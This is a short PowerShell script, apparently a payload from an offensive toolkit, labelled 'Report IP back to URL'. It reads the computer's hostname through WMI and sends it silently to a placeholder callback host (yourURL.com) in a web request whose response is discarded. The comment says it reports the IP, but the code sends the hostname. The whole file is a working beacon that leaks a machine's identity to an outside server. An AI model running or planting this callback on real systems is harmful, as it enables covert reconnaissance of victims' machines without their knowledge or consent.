# DFS
# Report IP back to URL

$HOSTNAME = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name
$CALLBACKURL = $("https://yourURL.com/search.html?code=" + "$HOSTNAME")
$CURL = New-Object System.Net.WebClient
$CURL.DownloadString("$CALLBACKURL") | Out-Null
